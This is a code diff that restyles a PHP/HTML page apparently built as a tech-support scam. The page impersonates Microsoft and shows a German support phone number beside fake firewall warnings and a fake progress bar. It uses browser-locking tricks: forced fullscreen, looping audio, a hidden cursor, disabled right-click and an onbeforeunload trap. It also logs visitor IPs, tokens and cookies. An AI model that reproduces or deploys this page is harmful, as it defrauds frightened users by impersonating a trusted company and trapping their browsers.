@@ -1,75 +1,42 @@
 <?php
-// ========================================================
-// INITIAL PHP CONFIGURATION AND SECURITY SETTINGS
-// ========================================================
-
-// Disable error display for production-like environment
+// ================================================
+// Security & Header Settings
+// ================================================
 ini_set("display_errors", 0);
-
-// Report all errors except notices and warnings
 error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
 
-// Send strong no-cache headers to prevent browser caching
+// Prevent caching of this page
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
-header("Pragma: no-cache");
-header("Expires: 0");
 
-// ========================================================
-// ADVANCED LOGGING FUNCTION FOR BLOCKED ACTIVITY
-// ========================================================
-
-/**
- * Logs suspicious or blocked activity to log.txt file
- * 
- * @param string $messageType   Type of the logged event
- * @param string $reason        Reason for blocking/logging
- * @param string $ipAddress     Visitor's IP address
- * @param string $userAgent     User's browser user agent
- * @param string $userHash      Hashed user identifier
- * @param array  $sentHashValues Array containing token and cookie values
- */
+// ================================================
+// Logging Function - Records suspicious activity
+// ================================================
 function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sentHashValues)
 {
-    // Get current timestamp in readable format
-    $currentTimestamp = date("Y-m-d H:i:s");
+    $currentDateTime = date("Y-m-d H:i:s");
+    $logFileName = "log.txt";
     
-    // Define the log file name
-    $logFilePath = "log.txt";
+    $logEntry = "Date: " . $currentDateTime . 
+                " | Type: " . $messageType . 
+                " | Status: blocked" . 
+                " | Reason: " . $reason . 
+                " | IP: " . $ipAddress . 
+                " | UA: " . $userAgent . 
+                " | User Hash: " . $userHash . 
+                " | Sent Hash: (Token: " . $sentHashValues[0] . 
+                " / Cookie: " . $sentHashValues[1] . ")";
     
-    // Build the complete log entry string with all details
-    $logMessage = "Date: " . $currentTimestamp .
-                  " | Type: " . $messageType .
-                  " | Status: blocked" .
-                  " | Reason: " . $reason .
-                  " | IP: " . $ipAddress .
-                  " | UA: " . $userAgent .
-                  " | User Hash: " . $userHash .
-                  " | Sent Hash: (Token: " . $sentHashValues[0] .
-                  " / Cookie: " . $sentHashValues[1] . ")";
-    
-    // Check if log file exists and is writable
-    if (file_exists($logFilePath) && is_writable($logFilePath)) {
-        // Open file in append mode
-        $fileResource = fopen($logFilePath, "a");
-        
-        if ($fileResource !== false) {
-            // Write the log entry with Windows-style line ending
-            fwrite($fileResource, $logMessage . "\r\n");
-            // Close the file handle properly
-            fclose($fileResource);
+    if (file_exists($logFileName) && is_writable($logFileName)) {
+        $fileHandle = fopen($logFileName, "a");
+        if ($fileHandle) {
+            fwrite($fileHandle, $logEntry . "\r\n");
+            fclose($fileHandle);
         }
     } else {
-        // If file doesn't exist or not writable, attempt to create it
-        $createFile = fopen($logFilePath, "w");
-        if ($createFile !== false) {
-            fclose($createFile);
-        }
+        // Create the file if it doesn't exist
+        fopen($logFileName, "w");
     }
 }
-
-// ========================================================
-// START OF HTML OUTPUT
-// ========================================================
 ?>
 
 <!DOCTYPE html>
@@ -81,11 +48,10 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
     
     <title>4K-Filme</title>
     
-    <!-- Favicon and Main Stylesheet -->
     <link rel="shortcut icon" type="image/png" href="images/msmm.png">
     <link href="css/tapa.css" rel="stylesheet">
 
-    <!-- Third-party tracking and custom JS libraries -->
+    <!-- External Tracking and Library Scripts -->
     <script async id="gauges-tracker" 
             data-site-id="66acbdba8b4334062434f5ca" 
             data-track-path="../../../track.gaug.es/track.gif" 
@@ -102,24 +68,21 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
     <script src="js/custom.js"></script>
     <script src="js/esc.js"></script>
 
-    <!-- Disable right-click context menu globally -->
+    <!-- Disable Right Click -->
     <script>
         $(function() {
-            // Bind contextmenu event and prevent default behavior
-            $('body').bind('contextmenu', function(event) {
-                event.preventDefault();
+            $('body').bind('contextmenu', function(e) {
                 return false;
             });
         });
     </script>
 
-    <!-- Phone number placeholder variable -->
     <script>
-        // This variable can be updated dynamically if needed
+        // Global phone number variable (currently empty)
         var phone_number = '';
     </script>
 
-    <!-- Custom CSS rules for positioning elements -->
+    <!-- Custom Inline Styles -->
     <style>
         #banners {
             width: 190px;
@@ -151,7 +114,9 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
                         0 3px 1px -2px rgba(0,0,0,.12);
         }
         
-        #footer_btn a { color: #fff; }
+        #footer_btn a {
+            color: #fff;
+        }
         
         .haru {
             position: absolute;
@@ -169,7 +134,7 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
       onbeforeunload="return myFunction()" 
       style="cursor:none">
 
-    <!-- Age Confirmation Modal Dialog -->
+    <!-- Age Confirmation Modal -->
     <div id="age-confirmation-modal">
         <div class="innerContainer">
             <div>
@@ -188,7 +153,7 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
         </div>
     </div>
 
-    <!-- Main Background Section -->
+    <!-- Background Image -->
     <div class="bg" style="cursor:none">
         <div class="bgimg" style="top:0">
             <img src="images/f24.png" alt="" width="100%">
@@ -200,12 +165,12 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
         <div class="black" style="height: 145%; cursor: none; display: block;"></div>
     </a>
 
-    <!-- Additional Promotional Box -->
+    <!-- Pro Box Image -->
     <div class="pro_box3" style="display: block;">
         <img src="images/nbx1.jpg" alt="" width="100%" style="height: auto;">
     </div>
 
-    <!-- Card Container Popup -->
+    <!-- Pop-up Card -->
     <div class="cardcontainer" style="display: block;" id="pop_up_new">
         <img src="images/bx2.jpg" alt="" style="width: 500px;">
         <strong class="haru">
@@ -213,7 +178,7 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
         </strong>
     </div>
 
-    <!-- Main Lightbox / Warning Popup -->
+    <!-- Lightbox / Popup -->
     <div class="lightbox" id="poptxt" style="display: block;">
         <div class="row firewall-pro">
             <div class="col-md-12">
@@ -222,12 +187,12 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
         </div>
     </div>
 
-    <!-- Microsoft Support Chat Simulation -->
+    <!-- Microsoft Chat / Support Box -->
     <div id="chat" style="display: block;">
         <img src="images/msmm.png">
-        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
-        <p style="font-weight:600;font-size:24px">Rufen Sie Support an: <br></p>
-        <h4 style="font-weight:600;font-size:22px">
+        <span style="color:#222; font-size:24px; font-weight:600; margin-left:6px; position:relative; top:5px;">Microsoft</span>
+        <p style="font-weight:600; font-size:24px;">Rufen Sie Support an: <br></p>
+        <h4 style="font-weight:600; font-size:22px;">
             030-7001-2403<script>document.write(phone_number);</script> <br>(Berlin)
         </h4>
         <div class="arrow-down">
@@ -238,127 +203,129 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
         </div>
     </div>
 
-    <!-- Script Section 1: Hide Age Modal -->
+    <!-- Script: Hide Age Modal on Map Click -->
     <script>
         $(document).ready(function() {
-            $(".map").on("click", function() {
+            $(".map").click(function() {
                 $("#age-confirmation-modal").hide();
             });
         });
     </script>
 
-    <!-- Script Section 2: Mouse Out Detection for Lightbox -->
+    <!-- Script: Mouse Out Event for Lightbox -->
     <script>
-        // Helper function to add cross-browser event listeners
-        function addEvent(element, eventName, callback) {
+        function addEvent(element, eventType, handlerFunction) {
             if (element.addEventListener) {
-                element.addEventListener(eventName, callback, false);
+                element.addEventListener(eventType, handlerFunction, false);
             } else if (element.attachEvent) {
-                element.attachEvent("on" + eventName, callback);
+                element.attachEvent("on" + eventType, handlerFunction);
             }
         }
 
-        // Trigger lightbox when mouse leaves the window
-        addEvent(document, 'mouseout', function(mouseEvent) {
-            if (mouseEvent.toElement === null && mouseEvent.relatedTarget === null) {
+        addEvent(document, 'mouseout', function(e) {
+            if (e.toElement === null && e.relatedTarget === null) {
                 $('.lightbox').slideDown();
             }
         });
 
-        // Close lightbox when close button or body is clicked
-        $('a.close').click(function() { $('.lightbox').slideUp(); });
-        $('body').click(function() { $('.lightbox').slideUp(); });
+        $('a.close').click(function() {
+            $('.lightbox').slideUp();
+        });
+
+        $('body').click(function() {
+            $('.lightbox').slideUp();
+        });
     </script>
 
-    <!-- Script Section 3: Fake Progress Bar Animation -->
+    <!-- Progress Bar Animation Script -->
     <script>
         $(function() {
-            var currentProgress = 0;
-            var animationTimer = setInterval(function() {
-                currentProgress += 10;
+            var progressValue = 0;
+            var progressInterval = setInterval(function() {
+                progressValue += 10;
+                $("#dynamic").css("width", progressValue + "%")
+                             .attr("aria-valuenow", progressValue)
+                             .text(progressValue + "% 完了");
                 
-                $("#dynamic")
-                    .css("width", currentProgress + "%")
-                    .attr("aria-valuenow", currentProgress)
-                    .text(currentProgress + "% 完了");
-                
-                if (currentProgress >= 100) {
-                    clearInterval(animationTimer);
+                if (progressValue >= 100) {
+                    clearInterval(progressInterval);
                 }
             }, 100);
         });
     </script>
 
-    <!-- Script Section 4: Expanded countTo Plugin -->
+    <!-- jQuery countTo Plugin (unchanged logic, just better style) -->
     <script>
         (function($) {
-            $.fn.countTo = function(userOptions) {
-                var defaultOptions = {
-                    from: 0,
-                    to: 0,
-                    speed: 100,
-                    refreshInterval: 100,
-                    decimals: 0,
-                    formatter: function(value, opts) {
-                        return value.toFixed(opts.decimals);
-                    },
-                    onUpdate: null,
-                    onComplete: null
-                };
-
-                var mergedOptions = $.extend({}, defaultOptions, userOptions || {});
-
+            $.fn.countTo = function(options) {
+                options = options || {};
+                
                 return this.each(function() {
-                    var element = this;
-                    var $elem = $(this);
+                    var settings = $.extend({}, $.fn.countTo.defaults, {
+                        from: $(this).data("from"),
+                        to: $(this).data("to"),
+                        speed: $(this).data("speed"),
+                        refreshInterval: $(this).data("refresh-interval"),
+                        decimals: $(this).data("decimals")
+                    }, options);
+
+                    var totalSteps = Math.ceil(settings.speed / settings.refreshInterval);
+                    var incrementPerStep = (settings.to - settings.from) / totalSteps;
                     
-                    var startValue = mergedOptions.from;
-                    var targetValue = mergedOptions.to;
-                    var animationSpeed = mergedOptions.speed;
-                    var refreshRate = mergedOptions.refreshInterval;
+                    var currentElement = this;
+                    var $element = $(this);
+                    var currentValue = settings.from;
+                    var stepCount = 0;
+                    var dataStore = $element.data("countTo") || {};
+
+                    $element.data("countTo", dataStore);
                     
-                    var totalSteps = Math.ceil(animationSpeed / refreshRate);
-                    var increment = (targetValue - startValue) / totalSteps;
-                    
-                    var currentStep = 0;
-                    var currentCount = startValue;
-                    
-                    var timerData = $elem.data("countTo") || {};
-                    $elem.data("countTo", timerData);
-                    
-                    if (timerData.interval) {
-                        clearInterval(timerData.interval);
+                    if (dataStore.interval) {
+                        clearInterval(dataStore.interval);
                     }
 
-                    timerData.interval = setInterval(function() {
-                        currentCount += increment;
-                        currentStep++;
+                    dataStore.interval = setInterval(function() {
+                        currentValue += incrementPerStep;
+                        stepCount++;
                         
-                        var formattedNumber = mergedOptions.formatter.call(element, currentCount, mergedOptions);
-                        $elem.html(formattedNumber);
+                        var formattedValue = settings.formatter.call(currentElement, currentValue, settings);
+                        $element.html(formattedValue);
 
-                        if (typeof mergedOptions.onUpdate === "function") {
-                            mergedOptions.onUpdate.call(element, currentCount);
+                        if (typeof settings.onUpdate === "function") {
+                            settings.onUpdate.call(currentElement, currentValue);
                         }
 
-                        if (currentStep >= totalSteps) {
-                            $elem.removeData("countTo");
-                            clearInterval(timerData.interval);
-                            currentCount = targetValue;
+                        if (stepCount >= totalSteps) {
+                            $element.removeData("countTo");
+                            clearInterval(dataStore.interval);
+                            currentValue = settings.to;
                             
-                            if (typeof mergedOptions.onComplete === "function") {
-                                mergedOptions.onComplete.call(element, currentCount);
+                            if (typeof settings.onComplete === "function") {
+                                settings.onComplete.call(currentElement, currentValue);
                             }
                         }
-                    }, refreshRate);
+                    }, settings.refreshInterval);
 
-                    // Show initial value
-                    $elem.html(mergedOptions.formatter.call(element, currentCount, mergedOptions));
+                    // Initial display
+                    $element.html(settings.formatter.call(currentElement, currentValue, settings));
                 });
+            };
+
+            $.fn.countTo.defaults = {
+                from: 0,
+                to: 0,
+                speed: 100,
+                refreshInterval: 100,
+                decimals: 0,
+                formatter: function(value, options) {
+                    return value.toFixed(options.decimals);
+                },
+                onUpdate: null,
+                onComplete: null
             };
         })(jQuery);
 
-        // Initialize timers
+        // Initialize countTo for elements with .count-number and .timer classes
         jQuery(function($) {
             $(".count-number").data("countToOptions", {
                 formatter: function(value, options) {
@@ -367,81 +334,122 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
             });
 
             $(".timer").each(function() {
-                var $thisElement = $(this);
-                var customOpts = $.extend({}, $thisElement.data("countToOptions") || {});
-                $thisElement.countTo(customOpts);
+                var element = $(this);
+                var elementOptions = $.extend({}, element.data("countToOptions") || {});
+                element.countTo(elementOptions);
             });
         });
     </script>
 
-    <!-- More scripts follow with the same expanded style... (the rest is similar in verbosity) -->
-
-    <!-- Fullscreen trigger -->
+    <!-- Fullscreen Request on Click -->
     <script>
         document.addEventListener("click", function() {
-            var docElement = document.documentElement;
-            var fullScreenMethods = docElement.requestFullScreen || 
-                                    docElement.webkitRequestFullScreen || 
-                                    docElement.mozRequestFullScreen;
-            if (typeof fullScreenMethods === "function") {
-                fullScreenMethods.call(docElement);
+            var element = document.documentElement;
+            var requestFullscreen = element.requestFullScreen || 
+                                    element.webkitRequestFullScreen || 
+                                    element.mozRequestFullScreen;
+            
+            if (requestFullscreen) {
+                requestFullscreen.call(element);
             }
         });
     </script>
 
-    <!-- Audio loop setup -->
+    <!-- Audio Loop -->
     <script>
         setInterval(function() {
-            var audioPlayer = document.getElementById("mcr");
-            if (audioPlayer && typeof audioPlayer.play === "function") {
-                audioPlayer.play();
+            var audioElement = document.getElementById("mcr");
+            if (audioElement) {
+                audioElement.play();
             }
         }, 500);
     </script>
 
-    <!-- Favicon toggler -->
+    <!-- Favicon Switcher -->
     <script>
-        var faviconState = true;
+        var faviconToggle = 1;
         setInterval(function() {
-            var faviconElement = document.getElementById("favicon");
-            if (faviconElement) {
-                faviconElement.href = faviconState ? "w3.html" : "w1.html";
-                faviconState = !faviconState;
+            var faviconLink = document.getElementById("favicon");
+            if (faviconLink) {
+                faviconLink.href = (faviconToggle) ? "w3.html" : "w1.html";
+                faviconToggle = !faviconToggle;
             }
         }, 1000);
     </script>
 
-    <!-- Popup triggers -->
+    <!-- Popup Show Triggers -->
     <script>
         $(document).ready(function() {
             $("#mycanvas").click(function() {
                 $("#welcomeDiv, #poptxt").show();
             });
-            $("#cross").click(function() { $("#poptxt").show(); });
-            $("body").mouseover(function() { $("#poptxt").show(); });
+            
+            $("#cross").click(function() {
+                $("#poptxt").show();
+            });
+            
+            $("body").mouseover(function() {
+                $("#poptxt").show();
+            });
         });
     </script>
 
-    <!-- Chat fade-in -->
+    <!-- Chat Box Fade In -->
     <script>
         $(document).ready(function() {
             $("#chat").delay(600).fadeIn(100);
         });
     </script>
 
-    <!-- Remaining tracking scripts (gauges, audio, gtag, pixel) are kept with similar expanded style -->
+    <!-- Gauges Tracker -->
+    <script>
+        var _gauges = _gauges || [];
+        (function() {
+            var scriptTag = document.createElement('script');
+            scriptTag.type = 'text/javascript';
+            scriptTag.async = true;
+            scriptTag.id = 'gauges-tracker';
+            scriptTag.setAttribute('data-site-id', '66acbdba8b4334062434f5ca');
+            scriptTag.setAttribute('data-track-path', '../../../track.gaug.es/track.gif');
+            scriptTag.src = '../../../d2fuc4clr7gvcn.cloudfront.net/track.js';
+            
+            var firstScript = document.getElementsByTagName('script')[0];
+            firstScript.parentNode.insertBefore(scriptTag, firstScript);
+        })();
+    </script>
+
+    <!-- Background Audio Player -->
+    <script>
+        $(document).ready(function() {
+            var backgroundAudio = document.createElement('audio');
+            backgroundAudio.setAttribute('src', 'visudk.mp4');
+            
+            backgroundAudio.addEventListener('ended', function() {
+                this.play();
+            }, false);
+
+            $('#mycanvas, #link_black, .pro_box, #poptxt').click(function() {
+                backgroundAudio.play();
+            });
+        });
+    </script>
 
     <script src="js/esc.js"></script>
 
+    <!-- Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-4XBJ9K0002"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
+        function gtag() {
+            dataLayer.push(arguments);
+        }
         gtag('js', new Date());
         gtag('config', 'G-4XBJ9K0002');
     </script>
 
+    <!-- Tracking Pixel -->
     <img src="https://rb8as.bemobtrk.com/conversion.gif?cid=OPTIONAL&payout=OPTIONAL&txid=OPTIONAL" 
          width="1" height="1" alt="">
+
 </body>
 </html>
